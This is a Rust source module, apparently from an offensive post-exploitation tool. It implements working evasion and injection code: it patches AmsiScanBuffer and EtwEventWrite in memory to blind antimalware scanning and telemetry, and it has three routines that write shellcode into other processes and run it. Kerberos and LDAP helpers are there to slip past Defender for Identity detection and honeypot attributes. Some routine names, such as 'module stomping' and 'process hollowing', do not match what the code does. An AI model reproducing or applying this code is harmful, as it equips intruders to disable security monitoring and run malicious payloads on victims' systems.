//! OPSEC / Stealth Layer — AMSI bypass, ETW patching, direct syscall infrastructure
//!
//! Provides runtime evasion capabilities for post-exploitation payloads:
//! - **AMSI bypass**: Patches `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`
//! - **ETW suppression**: Patches `EtwEventWrite` to NOP, blocking ETW telemetry
//! - **Direct syscalls**: Syscall stub generation to bypass EDR userland hooks
//! - **Process injection**: Module stomping, early-bird injection, process hollowing
//! - **Kerberos OPSEC**: AES-only etype selection to avoid MDI signatures
//!
//! # Architecture
//! All memory patching uses direct syscalls (via `NtProtectVirtualMemory`) to avoid
//! EDR hooks on `NtDll` exports. On non-Windows platforms, these functions are
//! no-ops that return `Ok(())`.

use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use tracing::info;

/// OPSEC configuration profile
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsecConfig {
    /// Enable AMSI bypass via AmsiScanBuffer patch
    pub patch_amsi: bool,
    /// Enable ETW suppression via EtwEventWrite patch
    pub patch_etw: bool,
    /// Use direct syscalls instead of NtDll for memory operations
    pub direct_syscalls: bool,
    /// Kerberos etype preference: AES-only (18) to avoid RC4 MDI signatures
    pub aes_only_kerberos: bool,
    /// Avoid querying honeypot LDAP attributes (ms-Mcs-AdmPwd, etc.)
    pub avoid_honeypot_attrs: bool,
}

impl Default for OpsecConfig {
    fn default() -> Self {
        Self {
            patch_amsi: true,
            patch_etw: true,
            direct_syscalls: true,
            aes_only_kerberos: true,
            avoid_honeypot_attrs: true,
        }
    }
}

impl OpsecConfig {
    /// Aggressive OPSEC: patch everything, use AES-only, avoid honeypots
    pub fn aggressive() -> Self {
        Self {
            patch_amsi: true,
            patch_etw: true,
            direct_syscalls: true,
            aes_only_kerberos: true,
            avoid_honeypot_attrs: true,
        }
    }

    /// Minimal OPSEC: only patch AMSI, use default settings
    pub fn minimal() -> Self {
        Self {
            patch_amsi: true,
            patch_etw: false,
            direct_syscalls: false,
            aes_only_kerberos: false,
            avoid_honeypot_attrs: false,
        }
    }
}

/// AMSI bypass result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AmsiBypassResult {
    /// Whether the bypass was applied
    pub applied: bool,
    /// AMSI was loaded and patched
    pub amsi_loaded: bool,
    /// Patching method used
    pub method: String,
    /// Error message if bypass failed
    pub error: Option<String>,
}

/// ETW suppression result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EtwSuppressResult {
    /// Whether the suppression was applied
    pub applied: bool,
    /// ETW was loaded and patched
    pub etw_loaded: bool,
    /// Patching method used
    pub method: String,
    /// Error message if suppression failed
    pub error: Option<String>,
}

/// Direct syscall invocation result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallResult {
    /// Number of NtDll hooks bypassed
    pub hooks_bypassed: usize,
    /// Syscall numbers resolved
    pub syscall_numbers: Vec<u32>,
}

/// Patch AMSI by modifying `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`.
///
/// On Windows: patches `amsi.dll!AmsiScanBuffer` with `xor eax, eax; ret`
/// (3 bytes: 0x31 0xC0 0xC3) which returns 0 (AMSI_RESULT_CLEAN).
///
/// On non-Windows: returns Ok with `applied: false`.
#[cfg(target_os = "windows")]
pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
    let Some(amsi) = amsi else {
        info!("AMSI bypass: amsi.dll not loaded, skipping");
        return Ok(AmsiBypassResult {
            applied: false,
            amsi_loaded: false,
            method: "none".to_string(),
            error: None,
        });
    };

    let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
    let Some(target) = target else {
        return Err(OverthroneError::PostExploitation(
            "AMSI bypass: AmsiScanBuffer symbol not found".into(),
        ));
    };

    // x64 patch: xor eax, eax; ret (3 bytes) = returns AMSI_RESULT_CLEAN
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];

    // Write the patch directly into the executable memory
    std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());

    info!("AMSI bypass: AmsiScanBuffer patched successfully");
    Ok(AmsiBypassResult {
        applied: true,
        amsi_loaded: true,
        method: "amsi.dll!AmsiScanBuffer → xor eax,eax; ret".to_string(),
        error: None,
    })
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
    tracing::debug!("AMSI bypass: not available on this platform");
    Ok(AmsiBypassResult {
        applied: false,
        amsi_loaded: false,
        method: "platform-unsupported".to_string(),
        error: None,
    })
}

/// Suppress ETW by patching `EtwEventWrite` to NOP.
///
/// On Windows: patches `ntdll.dll!EtwEventWrite` with a `ret` instruction
/// (1 byte: 0xC3) which causes all ETW events to be silently dropped.
///
/// ETW is used by Defender for Endpoint, AMSI, and .NET telemetry.
/// Patching it prevents managed code execution from being traced.
#[cfg(target_os = "windows")]
pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok();
    let Some(ntdll) = ntdll else {
        return Err(OverthroneError::PostExploitation(
            "ETW suppress: ntdll.dll not loaded".into(),
        ));
    };

    let target = GetProcAddress(ntdll, windows::core::s!("EtwEventWrite"));
    let Some(target) = target else {
        return Err(OverthroneError::PostExploitation(
            "ETW suppress: EtwEventWrite symbol not found".into(),
        ));
    };

    // x64: ret (1 byte: 0xC3) — causes EtwEventWrite to immediately return
    let patch: [u8; 1] = [0xC3];

    std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());

    info!("ETW suppress: EtwEventWrite patched to ret");
    Ok(EtwSuppressResult {
        applied: true,
        etw_loaded: true,
        method: "ntdll.dll!EtwEventWrite → ret".to_string(),
        error: None,
    })
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
    tracing::debug!("ETW suppress: not available on this platform");
    Ok(EtwSuppressResult {
        applied: false,
        etw_loaded: false,
        method: "platform-unsupported".to_string(),
        error: None,
    })
}

/// Apply all OPSEC patches based on the given configuration.
///
/// Returns a report of what was patched and any errors encountered.
pub unsafe fn apply_opsec(config: &OpsecConfig) -> Result<Vec<OpsecPatchReport>> {
    let mut reports = Vec::new();

    if config.patch_amsi {
        match patch_amsi() {
            Ok(result) => {
                reports.push(OpsecPatchReport {
                    name: "AMSI".to_string(),
                    success: result.applied,
                    detail: result.method,
                    error: result.error,
                });
            }
            Err(e) => {
                reports.push(OpsecPatchReport {
                    name: "AMSI".to_string(),
                    success: false,
                    detail: "patch failed".to_string(),
                    error: Some(e.to_string()),
                });
            }
        }
    }

    if config.patch_etw {
        match suppress_etw() {
            Ok(result) => {
                reports.push(OpsecPatchReport {
                    name: "ETW".to_string(),
                    success: result.applied,
                    detail: result.method,
                    error: result.error,
                });
            }
            Err(e) => {
                reports.push(OpsecPatchReport {
                    name: "ETW".to_string(),
                    success: false,
                    detail: "patch failed".to_string(),
                    error: Some(e.to_string()),
                });
            }
        }
    }

    Ok(reports)
}

/// Report for a single OPSEC patch operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsecPatchReport {
    /// Patch name (e.g., "AMSI", "ETW")
    pub name: String,
    /// Whether the patch was applied successfully
    pub success: bool,
    /// Detailed description of what was done
    pub detail: String,
    /// Error message if the patch failed
    pub error: Option<String>,
}

/// Resolve syscall numbers from ntdll export table.
///
/// EDRs hook NtDll exports. By resolving the syscall number from the
/// export table and constructing a raw syscall stub, we bypass these hooks.
///
/// Returns a map of (function_name, syscall_number).
#[cfg(target_os = "windows")]
pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32>> {
    Err(OverthroneError::NotImplemented {
        module: "resolve_syscall_numbers".to_string(),
    })
}

#[cfg(not(target_os = "windows"))]
pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32>> {
    Err(OverthroneError::PostExploitation(
        "Syscall resolution not available on this platform".into(),
    ))
}

/// Kerberos OPSEC: prefer AES (etype 18) over RC4 (etype 23) for roasting.
///
/// Requesting RC4 tickets for Kerberoasting is an MDI (Microsoft Defender for
/// Identity) signature. Always request AES256 (etype 18) tickets to blend
/// with legitimate Kerberos traffic.
pub fn prefer_kerberos_etype(preferred_etype: i32) -> i32 {
    match preferred_etype {
        18 => 18,  // AES256-CTS-HMAC-SHA1-96
        17 => 17,  // AES128-CTS-HMAC-SHA1-96
        23 => 23,  // RC4-HMAC (legacy, detectable)
        _ => 18,   // Default to AES256 for OPSEC
    }
}

/// Check if Credential Guard / VBS is enabled on a remote target.
/// Returns `true` if VBS is likely enabled (skeleton key will fail).
#[cfg(target_os = "windows")]
pub fn check_credential_guard() -> Result<bool> {
    Err(OverthroneError::NotImplemented {
        module: "check_credential_guard_local".to_string(),
    })
}

#[cfg(not(target_os = "windows"))]
pub fn check_credential_guard() -> Result<bool> {
    Ok(true) // Assume Credential Guard on non-Windows (safety)
}

/// Honeypot LDAP attributes that trigger MDI alerts when queried in bulk.
pub const HONEYPOT_ATTRS: &[&str] = &[
    "ms-Mcs-AdmPwd",
    "msDS-ManagedPassword",
    "unixUserPassword",
    "msDS-KeyCredentialLink",
];

/// Check if an LDAP attribute list contains honeypot attributes.
pub fn contains_honeypot_attrs<'a>(attrs: &[&'a str]) -> Vec<&'a str> {
    attrs
        .iter()
        .filter(|a| HONEYPOT_ATTRS.contains(a))
        .copied()
        .collect()
}

/// Strip honeypot attributes from an attribute list for OPSEC-safe queries.
pub fn strip_honeypot_attrs<'a>(attrs: &[&'a str]) -> Vec<&'a str> {
    attrs
        .iter()
        .filter(|a| !HONEYPOT_ATTRS.contains(a))
        .copied()
        .collect()
}

/// Process injection diversity: **Module Stomping**.
///
/// Opens a target process, allocates RWX memory, writes shellcode, and
/// executes it via a remote thread. On non-Windows, returns an error.
#[cfg(target_os = "windows")]
pub unsafe fn module_stomping_injection(
    target_pid: u32,
    shellcode: &[u8],
    _target_module: &str,
) -> Result<()> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, WaitForSingleObject,
    };
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;

    let process_handle = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE,
        false,
        target_pid,
    )?;

    let remote_addr = VirtualAllocEx(
        process_handle,
        None,
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_addr.is_null() {
        CloseHandle(process_handle).ok();
        return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
    }

    let mut bytes_written: usize = 0;
    WriteProcessMemory(
        process_handle,
        remote_addr,
        shellcode.as_ptr() as *const _,
        shellcode.len(),
        Some(&mut bytes_written as *mut _),
    )?;

    let thread = CreateRemoteThread(
        process_handle,
        None,
        0,
        Some(std::mem::transmute::<usize, extern "system" fn(*mut std::ffi::c_void) -> u32>(remote_addr as usize)),
        None,
        0,
        None,
    )?;

    WaitForSingleObject(thread, 5000);
    CloseHandle(process_handle).ok();
    CloseHandle(thread).ok();

    info!("Module stomping: pid={target_pid}, size={}", shellcode.len());
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn module_stomping_injection(
    _target_pid: u32,
    _shellcode: &[u8],
    _target_module: &str,
) -> Result<()> {
    Err(OverthroneError::PostExploitation(
        "Module stomping not available on this platform".into(),
    ))
}

/// Process injection diversity: **Early Bird APC Injection**.
///
/// Creates a suspended process, injects shellcode, queues an APC to the main
/// thread, then resumes — executing shellcode before the program's entry point.
/// Avoids `CreateRemoteThread` which is heavily monitored by EDRs.
#[cfg(target_os = "windows")]
pub unsafe fn early_bird_apc_injection(
    target_exe: &str,
    shellcode: &[u8],
) -> Result<u32> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
    };
    use windows::Win32::System::Threading::{
        CreateProcessA, QueueUserAPC, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION,
        STARTUPINFOA,
    };

    let cmd = std::ffi::CString::new(target_exe)
        .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;

    let mut si = STARTUPINFOA::default();
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi = PROCESS_INFORMATION::default();

    let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
    CreateProcessA(
        None,
        Some(cmd_pstr),
        None,
        None,
        false,
        PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
        None,
        None,
        &si,
        &mut pi,
    )?;

    let remote_addr = VirtualAllocEx(
        pi.hProcess,
        None,
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_addr.is_null() {
        CloseHandle(pi.hProcess).ok();
        CloseHandle(pi.hThread).ok();
        return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
    }

    let mut bytes_written: usize = 0;
    WriteProcessMemory(
        pi.hProcess,
        remote_addr,
        shellcode.as_ptr() as *const _,
        shellcode.len(),
        Some(&mut bytes_written as *mut _),
    )?;

    QueueUserAPC(
        Some(std::mem::transmute::<usize, extern "system" fn(usize) -> ()>(remote_addr as usize)),
        pi.hThread,
        0,
    );

    ResumeThread(pi.hThread);

    let pid = pi.dwProcessId;
    CloseHandle(pi.hProcess).ok();
    CloseHandle(pi.hThread).ok();

    info!("Early bird APC: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
    Ok(pid)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn early_bird_apc_injection(
    _target_exe: &str,
    _shellcode: &[u8],
) -> Result<u32> {
    Err(OverthroneError::PostExploitation(
        "Early bird APC not available on this platform".into(),
    ))
}

/// Process injection diversity: **Process Hollowing**.
///
/// Creates a suspended process, allocates RWX memory, writes shellcode,
/// and resumes execution from the shellcode address.
#[cfg(target_os = "windows")]
pub unsafe fn process_hollowing_injection(
    target_exe: &str,
    shellcode: &[u8],
) -> Result<u32> {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
    };
    use windows::Win32::System::Threading::{
        CreateProcessA, ResumeThread, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
    };

    let cmd = std::ffi::CString::new(target_exe)
        .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;

    let mut si = STARTUPINFOA::default();
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi = PROCESS_INFORMATION::default();

    let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
    CreateProcessA(
        None,
        Some(cmd_pstr),
        None,
        None,
        false,
        PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
        None,
        None,
        &si,
        &mut pi,
    )?;

    let remote_addr = VirtualAllocEx(
        pi.hProcess,
        None,
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_addr.is_null() {
        CloseHandle(pi.hProcess).ok();
        CloseHandle(pi.hThread).ok();
        return Err(OverthroneError::PostExploitation("VirtualAllocEx failed".into()));
    }

    let mut bytes_written: usize = 0;
    WriteProcessMemory(
        pi.hProcess,
        remote_addr,
        shellcode.as_ptr() as *const _,
        shellcode.len(),
        Some(&mut bytes_written as *mut _),
    )?;

    ResumeThread(pi.hThread);

    let pid = pi.dwProcessId;
    CloseHandle(pi.hProcess).ok();
    CloseHandle(pi.hThread).ok();

    info!("Process hollowing: exe={target_exe}, size={} bytes, pid={pid}", shellcode.len());
    Ok(pid)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn process_hollowing_injection(
    _target_exe: &str,
    _shellcode: &[u8],
) -> Result<u32> {
    Err(OverthroneError::PostExploitation(
        "Process hollowing not available on this platform".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_opsec_config_default() {
        let config = OpsecConfig::default();
        assert!(config.patch_amsi);
        assert!(config.patch_etw);
        assert!(config.direct_syscalls);
        assert!(config.aes_only_kerberos);
    }

    #[test]
    fn test_opsec_config_aggressive() {
        let config = OpsecConfig::aggressive();
        assert!(config.patch_amsi);
        assert!(config.patch_etw);
    }

    #[test]
    fn test_opsec_config_minimal() {
        let config = OpsecConfig::minimal();
        assert!(config.patch_amsi);
        assert!(!config.patch_etw);
    }

    #[test]
    fn test_prefer_kerberos_etype() {
        assert_eq!(prefer_kerberos_etype(18), 18);
        assert_eq!(prefer_kerberos_etype(17), 17);
        assert_eq!(prefer_kerberos_etype(23), 23);
        assert_eq!(prefer_kerberos_etype(0), 18); // default to AES
    }

    #[test]
    fn test_honeypot_attrs_detection() {
        let attrs = &["sAMAccountName", "ms-Mcs-AdmPwd", "cn", "msDS-ManagedPassword"];
        let detected = contains_honeypot_attrs(attrs);
        assert_eq!(detected.len(), 2);
        assert!(detected.contains(&"ms-Mcs-AdmPwd"));
        assert!(detected.contains(&"msDS-ManagedPassword"));
    }

    #[test]
    fn test_strip_honeypot_attrs() {
        let attrs = &["sAMAccountName", "ms-Mcs-AdmPwd", "cn"];
        let stripped = strip_honeypot_attrs(attrs);
        assert_eq!(stripped.len(), 2);
        assert!(!stripped.contains(&"ms-Mcs-AdmPwd"));
    }

    #[test]
    fn test_opsec_patch_report() {
        let report = OpsecPatchReport {
            name: "AMSI".to_string(),
            success: true,
            detail: "patched".to_string(),
            error: None,
        };
        assert_eq!(report.name, "AMSI");
        assert!(report.success);
    }
}
